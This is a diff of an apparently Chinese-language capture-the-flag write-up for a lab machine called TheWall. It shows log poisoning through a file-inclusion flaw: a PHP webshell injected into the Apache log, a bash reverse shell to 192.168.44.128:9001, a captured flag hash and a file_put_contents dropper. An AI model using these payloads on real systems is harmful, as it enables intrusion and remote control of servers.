@@ -36,12 +36,31 @@ wfuzz -c --hc=404 --hh=2 -t 100 -w /usr/share/wordlists/dirbuster/directory-list
 
 那我们可以尝试写入webshell到日志，然后取包含它
 
-```c
+```css
 ┌──(kali㉿kali)-[~]
 └─$ nc 192.168.18.238 80
 GET <?php system($_GET['cmd']); ?>
 
-http://192.168.18.238/includes.php?display_page=/var/log/apache2/access.log&cmd=bash -i >& /dev/tcp/192.168.44.128/9001 0>&1
-```
 
 http://192.168.18.238/includes.php?display_page=/var/log/apache2/access.log&cmd=bash+-c+%27bash+-i+%3E%26/dev/tcp/192.168.44.128/9001+0%3E%261%27
+```
+
+获得第一个flag
+```c
+www-data@TheWall:/home/john$ cat user.txt
+cat user.txt
+cc5db5e7b0a26e807765f47a006f6221
+```
+
+使用file_put_contents函数写入shell
+
+```c
+nc 192.168.18.238 80 
+GET <?php file_put_contents('/var/www/html/a.php',base64_decode($_GET['a'])); ?>
+```
+
+访问一下链接：http://192.168.1.226/includes.php?display_page=/var/log/apache2/access.log
+然后确定`<?php phpinfo();?>`base64编码的代码
+```css
+http://192.168.18.238/includes.php?display_page=/var/log/apache2/access.log&a=PD9waHAgcGhwaW5mbygpOyA/Pg==
+```
